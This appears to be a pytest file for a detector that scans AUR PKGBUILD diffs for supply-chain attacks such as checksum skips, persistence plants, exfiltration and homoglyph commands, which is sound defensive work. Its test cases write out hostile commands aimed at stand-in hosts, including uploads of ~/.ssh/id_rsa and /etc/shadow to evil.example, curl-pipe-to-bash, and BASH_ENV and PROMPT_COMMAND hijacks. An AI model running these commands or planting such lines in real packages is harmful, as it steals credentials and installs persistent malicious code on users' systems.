"""Checksum arrays, distro package tools, persistence plants, and exfiltration."""

import pytest

from .helpers import _shipped_ids, _x

# ---------------------------------------------------------------------------
# Audit v24-v38 - the checksum array, distro package tools, pattern references
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("array", [
    "sha256sums", "sha512sums", "b2sums", "md5sums", "sha1sums",
])
def test_a_skip_in_any_checksum_array_disables_verification(array):
    """makepkg verifies with whichever array the package declares.

    Reading `sha256sums` alone - "the PKGBUILD default" - meant a package
    shipping only `b2sums` was verified by that one, and `b2sums=('SKIP')`
    disabled verification while reporting `unchanged`: R004 did not fire at
    all. Modern AUR packages increasingly ship `b2sums`, so the default was
    becoming the minority case.
    """
    from trustsight.differ import detect_checksum_changes

    assert detect_checksum_changes(f"+{array}=('SKIP')") == (
        "changed_from_sha256_to_skip"
    )


def test_a_real_hash_in_any_array_is_not_a_skip():
    from trustsight.differ import detect_checksum_changes

    assert detect_checksum_changes("+b2sums=('" + "a" * 128 + "')") == (
        "checksum_added_or_changed"
    )


def test_a_vcs_source_on_a_context_line_justifies_its_skip():
    """A VCS source is a fact about the package whether or not *this* diff
    changed the line.

    Anchoring the justification checks on added lines meant a `-git`
    package whose `source=(git+...)` sat on a context line had its
    mandatory SKIP read as unjustified - invisible until checksum
    detection stopped looking at `sha256sums` alone, because these
    packages carry `b2sums` or `md5sums`.
    """
    from trustsight.differ import is_skip_justified

    context = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,6 @@\n"
        ' source=("git+https://github.com/u/p")\n'
        "+md5sums=('SKIP')\n"
    )
    assert is_skip_justified(context) == "vcs source"
    # A source this diff *deletes* justifies nothing.
    removed = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,6 @@\n"
        '-source=("git+https://github.com/u/p")\n'
        "+md5sums=('SKIP')\n"
    )
    assert is_skip_justified(removed) == ""


@pytest.mark.parametrize("command", [
    "pacman -U ./evil-1.0-1-x86_64.pkg.tar.zst",
    "pacman -S --noconfirm evil-pkg",
    "makepkg -si",
    "apt-get install -y evil",
])
def test_installing_a_package_from_a_build_function_is_claimed(command):
    """`pacman -U ./evil.pkg.tar.zst` inside `build()` installs a package as
    root, scriptlets and all.

    R081 claims *foreign* package managers in install hooks; pacman is not
    foreign and a build function is not a hook, so this fell between the
    two. A recipe has no business installing packages - makepkg resolves
    `depends` for that.
    """
    assert "X011" in _x([f"  {command}"]), command


@pytest.mark.parametrize("quiet", [
    "makepkg -f",
    "makepkg --printsrcinfo",
    "make install",
])
def test_a_build_or_metadata_command_is_not_an_install(quiet):
    assert "X011" not in _x([f"  {quiet}"]), quiet


@pytest.mark.parametrize("reference,expected", [
    ("for i in 1 2 3; do bash r$i.sh; done", True),
    ('for f in *.sh; do bash "$f"; done', True),
    ("bash r?.sh", True),
    ("make", False),
    # A reference that matches everything names nothing: `$f` alone would
    # pull in every committed file.
    ('bash "$f"', False),
])
def test_a_pattern_reference_selects_its_companions(reference, expected):
    """`bash r$i.sh` inside a loop names a *set* of committed files.

    The literal-name test resolved neither a variable nor a glob, so a
    payload split across `r1.sh`, `r2.sh`, `r3.sh` was committed, executed,
    and never read - the loop was the only thing between the reference and
    the file.
    """
    from trustsight.differ import _referenced_by_pattern

    assert _referenced_by_pattern("r1.sh", reference) is expected, reference


def test_pattern_reference_matching_is_linear():
    """Unanchored, the leading run retried from every position and measured
    387 ms on a full-length hostile line."""
    import time

    from trustsight.differ import _referenced_by_pattern

    def cost(n):
        text = "bash " + "a" * n
        best = float("inf")
        for _ in range(3):
            start = time.perf_counter()
            _referenced_by_pattern("r1.sh", text)
            best = min(best, time.perf_counter() - start)
        return best

    small, large = cost(2000), cost(8000)
    assert large < small * 9, f"growth {large / small:.1f}x over 4x input"


def test_a_cvs_root_is_an_address():
    """`:pserver:user@host:/repo` names a remote in its own notation."""
    from trustsight.analysis.build import fetch_addresses

    line = "cvs -d :pserver:anon@evil.example:/cvsroot checkout p"
    assert list(fetch_addresses(line)) == [":pserver:anon@evil.example:/cvsroot"]


def test_the_autostart_surface_is_a_persistence_plant():
    """R054 claimed cron and *system* units; everything else that runs
    without anyone asking it to was silent.

    A `.desktop` in `xdg/autostart` starts with the session, a systemd
    **user** unit starts with the user's login, `profile.d` runs in every
    new shell, `Xsession.d` at graphical login, a D-Bus policy grants
    on-demand activation, and `sudoers.d` decides who may become root.
    """
    for path in ("etc/xdg/autostart/e.desktop", "usr/lib/systemd/user/e.service",
                 "etc/profile.d/e.sh", "etc/sudoers.d/e",
                 "etc/X11/Xsession.d/99e", "etc/dbus-1/system.d/e.conf"):
        fired = _shipped_ids([f'  install -Dm644 e "$pkgdir/{path}"'],
                             declared=False, fn="package")
        assert "R054" in fired, path


@pytest.mark.parametrize("ordinary", [
    'install -Dm644 e.desktop "$pkgdir/usr/share/applications/e.desktop"',
    'install -Dm644 e.conf "$pkgdir/usr/lib/tmpfiles.d/e.conf"',
    'install -Dm755 p "$pkgdir/usr/bin/p"',
    "if [[ -f /etc/profile.d/cuda.sh ]]; then true; fi",
])
def test_ordinary_staging_is_not_a_persistence_plant(ordinary):
    """A menu entry runs when the user clicks it; `tmpfiles.d` is what
    ordinary packages ship; and a *read* is not a plant - the path alone
    matched `if [[ -f /etc/profile.d/cuda.sh ]]`, which was a pre-existing
    weakness that widening the path list would have amplified.
    """
    assert "R054" not in _shipped_ids([f"  {ordinary}"], declared=False,
                                      fn="package"), ordinary


def test_property_extraction_works_without_a_srcinfo():
    """A `.splitlines()` sweep renamed the receiver instead of the call.

    `new_pkgbuild.splitlines()` became `new_split_lines(pkgbuild)` - a live
    `NameError` on every full-AUR property extraction that had no `.SRCINFO`
    to prefer, which is the fallback path the function exists to provide.
    Nothing exercised it, so the suite stayed green.
    """
    from trustsight.full_aur.properties import extract_properties

    pkgbuild = (
        "pkgname=p\n"
        "depends=('a' 'b')\n"
        "source=('https://github.com/org/repo/archive/v1.tar.gz')\n"
        "build() { make; }\n"
    )
    props = extract_properties(pkgbuild)
    assert props["depends"] == frozenset({"a", "b"})
    assert "github.com" in props["source_hosts"]

    # The .SRCINFO branch is preferred when one is supplied.
    assert extract_properties(pkgbuild, srcinfo="depends = c\n")["depends"] == (
        frozenset({"c"})
    )


@pytest.mark.parametrize("loop,committed", [
    ("for i in 1 2 3; do bash r$i.sh; done", ("r1.sh", "r2.sh")),
    ('for f in *.sh; do bash "$f"; done', ("r1.sh", "r2.sh")),
    ('while read f; do bash "$f"; done < list', ("r1.sh",)),
])
def test_a_loop_executing_committed_helpers_is_claimed(loop, committed):
    """`do bash "$f"` is a command position, and `$f` names what the loop
    iterates.

    Two separate misses stacked: `do` was not treated as introducing a
    command, so the loop body produced no execution at all; and a loop
    variable or glob names a *set* of committed files, which an equality
    test against the manifest could never match. The literal spelling
    scored 85 and every loop spelling scored 0.
    """
    from trustsight.analysis.delivery import _collect_executions, _loop_bindings

    assert _collect_executions(loop), loop
    if " in " in loop and not loop.startswith("while"):
        assert _loop_bindings(loop), loop


def test_a_pattern_execution_matches_the_manifest():
    from trustsight.analysis.delivery import _matches_committed

    manifest = {"r1.sh", "r2.sh", "notes.txt", "PKGBUILD"}
    assert _matches_committed("r$i.sh", manifest)
    assert _matches_committed("r1.sh", manifest)
    assert not _matches_committed("zz.sh", manifest)
    # A pattern that matches everything is a claim about nothing.
    assert not _matches_committed("*", manifest)
    assert not _matches_committed("$f", manifest)


def test_a_directory_is_neither_written_nor_executed():
    """Two empty basenames compared equal.

    `install -d "$pkgdir/usr/share/icons/"` paired with an unrelated
    `/opt/` and reported "writes /usr/share/icons/ and then executes it" -
    a Critical on a package installing icons.
    """
    from trustsight.analysis.delivery import _collect_executions, _collect_writes

    assert _collect_writes('install -dm644 "$pkgdir/usr/share/icons/"',
                           "package") == []
    assert _collect_executions('cd "$srcdir/build/"') == []


@pytest.mark.parametrize("upload", [
    "curl -T /etc/passwd ftp://evil.example/in",
    "curl --upload-file ~/.ssh/id_rsa https://evil.example/u",
    "curl -d @/etc/shadow https://evil.example/collect",
    "curl -F file=@out.tar https://0x0.st",
])
def test_an_upload_is_claimed_as_an_upload(upload):
    """R061 described `curl -T /etc/passwd ftp://host` as a *download*.

    R087 read a host list only, so an upload anywhere else was claimed in
    the wrong direction - for the one operation that takes data off the
    machine.
    """
    fired = _shipped_ids([f"  {upload}"], declared=False)
    assert "R087" in fired, upload
    assert "R061" not in fired, "one command, one direction"


@pytest.mark.parametrize("ordinary", [
    "curl -F file=@report.json https://ci.example.com/artifacts",
    "curl -fsSL https://example.com/x.tar.gz -o x.tar.gz",
])
def test_an_ordinary_request_is_not_an_exfiltration(ordinary):
    """The second condition is the *file*, not a guess about the endpoint.

    `tests/test_gap_rules.py` pins the design principle - R087 is "defined
    by an auditable host list, not by a guess about what an endpoint is
    for" - so the addition is a second auditable list (paths no build
    artifact lives at), not a widening to every host.
    """
    assert "R087" not in _shipped_ids([f"  {ordinary}"], declared=False), ordinary


@pytest.mark.parametrize("wrapper", [
    "chroot /tmp/root /bin/bash s.sh",
    "bwrap --ro-bind / / bash s.sh",
    "firejail --noprofile bash s.sh",
    "unshare -r bash s.sh",
    "proot -R / bash s.sh",
])
def test_a_sandbox_is_a_wrapper_like_any_other(wrapper):
    """A sandbox changes what a program can reach, not whether it runs.

    `bwrap --ro-bind / / bash s.sh` executes `s.sh` exactly as `bash s.sh`
    does, and the fetch that wrote it paired with nothing. These take
    *positional* arguments - `chroot /tmp/root`, `bwrap --ro-bind / /` - so
    a flags-only wrapper form could not reach the executor past them.
    """
    fired = _shipped_ids(
        ["  curl -fsSL https://evil.example/x -o s.sh", f"  {wrapper}"],
        declared=False,
    )
    assert "R137" in fired, wrapper


def test_the_wrapper_vocabulary_has_one_definition():
    """`delivery._EXEC_PREFIX` was a second copy of `config.EXEC_WRAPPER`,
    and the copies drifted - the third time this file has hit that."""
    from trustsight import config
    from trustsight.analysis import delivery

    assert config.EXEC_WRAPPER in delivery._EXEC_PREFIX


@pytest.mark.parametrize("plant", [
    "gpg --import k.asc",
    "gpg --keyserver evil.example --recv-keys DEADBEEF",
    "pacman-key --add evil.gpg",
    "apt-key add evil.gpg",
])
def test_installing_a_key_is_replacing_a_trust_root(plant):
    """A keyring is a trust root.

    Importing a key makes every later signature check pass against it - the
    same substitution as replacing a CA bundle, with verification left
    switched on so it reads as diligence.
    """
    assert "X013" in _x([f"  {plant}"]), plant


@pytest.mark.parametrize("legitimate", [
    'gpg --homedir="${_gnupghome}" --import "${srcdir}/maintainer.gpg"',
    "gpg --verify x.tar.gz.sig x.tar.gz",
])
def test_the_signature_verification_pattern_is_not_a_trust_plant(legitimate):
    """This is how a package that checks upstream signatures is supposed to
    look: the key arrives through `source=()`, so makepkg checksums it and
    the diff shows any change, and `--homedir` scopes the import to a
    throwaway keyring. A key fetched at build time is not covered by that
    chain, and R061/R137 claim the fetch on its own line.
    """
    assert "X013" not in _x([f"  {legitimate}"]), legitimate


def test_ld_so_conf_d_is_a_persistence_plant():
    """A directory added to the loader search path is code loaded into every
    process that starts afterwards.

    It was excluded in a first pass that measured five paths together and
    read the aggregate as if it applied to each; on its own it appears in
    zero of the 3,246 benign diffs.
    """
    assert "R054" in _shipped_ids(
        ['  install -Dm644 e.conf "$pkgdir/etc/ld.so.conf.d/e.conf"'],
        declared=False, fn="package",
    )
    # `tmpfiles.d` creates files at boot rather than loading code, and
    # ordinary packages ship it.
    assert "R054" not in _shipped_ids(
        ['  install -Dm644 e.conf "$pkgdir/usr/lib/tmpfiles.d/e.conf"'],
        declared=False, fn="package",
    )


@pytest.mark.parametrize("assignment", [
    'export BASH_ENV="/tmp/evil.sh"',
    'export ENV="$srcdir/e.sh"',
    'export PROMPT_COMMAND="curl e | bash"',
    'GIT_SSH_COMMAND="sh -c evil"',
    'export LESSOPEN="|/tmp/e.sh %s"',
    "export LD_AUDIT=/tmp/e.so",
])
def test_an_environment_variable_that_names_code_is_claimed(assignment):
    """X014: the assignment *is* the execution.

    `BASH_ENV` and `ENV` are sourced by every non-interactive shell bash or
    sh starts, so setting one makes every later `bash -c`, every sub-make
    recipe line and every helper script run the named file first. X012
    covers a toolchain *path*; this covers a variable whose value something
    runs on its own initiative.
    """
    assert "X014" in _x([f"  {assignment}", "  make"]), assignment


@pytest.mark.parametrize("inert", [
    "export PAGER=cat",
    "export EDITOR=true",
    "export PAGER=",
])
def test_setting_one_of_them_inert_is_not_a_finding(inert):
    """`PAGER=cat` is how a recipe stops a tool opening a pager in a build
    log, which is the opposite of running something."""
    assert "X014" not in _x([f"  {inert}"]), inert


@pytest.mark.parametrize("binding,execution", [
    ('set -- "$srcdir"/*.sh', 'bash "$1"'),
    ("set -- *.sh", "bash $@"),
    ("a=(*.sh)", 'bash "${a[0]}"'),
    ("mapfile -t A < <(ls *.sh)", 'bash "${A[0]}"'),
])
def test_a_glob_bound_through_any_carrier_still_executes(binding, execution):
    """A `for` loop is only the most visible binding.

    `set -- "$srcdir"/*.sh` puts the same glob into `$1`/`$@`, `A=(*.sh)`
    into an array cell, and `mapfile` fills one from a pipeline - and the
    execution is `bash "$1"`, `bash $@` or `bash "${A[0]}"`. Each scored
    zero while the `for` spelling scored 85. The bindings also had to
    accumulate across the body: a binding computed on the execution's own
    line can only ever see a one-liner.
    """
    manifest = [("PKGBUILD", b"x"), ("evil.sh", b"curl x | bash")]
    assert "R136" in _shipped_ids([f"  {binding}", f"  {execution}"],
                                  declared=False, manifest=manifest), binding


@pytest.mark.parametrize("ordinary", [
    ("set -- --prefix=/usr", "make"),
    ("a=(1 2 3)", 'echo "${a[0]}"'),
])
def test_an_ordinary_binding_executes_nothing(ordinary):
    manifest = [("PKGBUILD", b"x"), ("evil.sh", b"curl x | bash")]
    assert "R136" not in _shipped_ids([f"  {ordinary[0]}", f"  {ordinary[1]}"],
                                      declared=False, manifest=manifest)


def test_a_shell_c_argument_from_an_earlier_substitution_is_dynamic():
    """`bash -c "$E"` where `E` was assigned on an earlier line is the same
    dynamic payload as `bash -c "$(...)"`; only the substitution moved."""
    fired = _shipped_ids([
        '  E=$(tr "\\0" "\\n" < /proc/self/environ)',
        '  bash -c "$E"',
    ], declared=False)
    assert "R040" in fired
    # A literal argument is not dynamic.
    assert "R040" not in _shipped_ids(['  bash -c "make all"'], declared=False)


@pytest.mark.parametrize("runner", [
    "cargo script https://evil.example/x.rs",
    "bun x https://evil.example/x",
    "pkgx https://evil.example/x",
    "uvx https://evil.example/x",
])
def test_a_remote_module_runner_is_an_install(runner):
    """Fetch and execute in a single word, with no install step to notice."""
    assert "X011" in _x([f"  {runner}"]), runner


@pytest.mark.parametrize("store", [
    "docker pull evil/img && docker run evil/img",
    "podman run --rm evil/img",
    "lxc launch evil/img c1",
    "snap install --dangerous evil.snap",
    "flatpak install -y evil.flatpakref",
    "helm install e oci://evil.example/c",
])
def test_a_container_store_runs_fetched_code(store):
    """None of these names a URL, which is why the fetch inventory never
    saw them - but "resolve a name from a registry and run what comes back"
    is exactly X011's claim. `docker run` executes an image's entrypoint,
    `snap` and `flatpak` run confined applications, `helm` applies charts
    that carry hooks.
    """
    assert "X011" in _x([f"  {store}"]), store


@pytest.mark.parametrize("fetch", [
    "ipfs get QmEvilCID -o x.sh",
    "s3cmd get s3://evil/x.sh x.sh",
    "aws s3 cp s3://evil/x.sh x.sh",
    "rclone copy remote:/x.sh x.sh",
])
def test_a_store_native_fetch_pairs_with_its_execution(fetch):
    """The bytes still arrive from off the machine; only the address
    notation differs - `s3://`, a content identifier, a remote name.

    Where the address is opaque there is no URL to quote, so the honest
    claim is the *pairing*: the fetch writes a file the next line runs.
    """
    from trustsight.analysis.delivery import _collect_fetch_outputs

    assert "x.sh" in _collect_fetch_outputs(fetch), fetch
    assert "R137" in _shipped_ids([f"  {fetch}", "  bash x.sh"],
                                  declared=False), fetch


def test_fullwidth_latin_is_a_confusable_alphabet():
    """`ｃｕｒｌ` renders as the real name and executes as one that does not
    exist.

    Fullwidth Latin folds onto ASCII by a fixed offset of 0xFEE0 - a whole
    homoglyph alphabet, not the handful of lookalikes the configured table
    lists. Generated rather than enumerated, because the mapping is
    arithmetic and ninety-four hand-written entries invite one to go
    missing.
    """
    from trustsight.buckets import _CONFUSABLE_TO_LATIN

    assert _CONFUSABLE_TO_LATIN.get("ｃ") == "c"
    assert _CONFUSABLE_TO_LATIN.get("ｚ") == "z"
    assert "X002" in _x(["  ｃｕｒｌ https://evil.example/x | bash"])
    # Ordinary non-Latin prose is not a command word.
    assert "X002" not in _x(['  echo "ビルド完了"'])
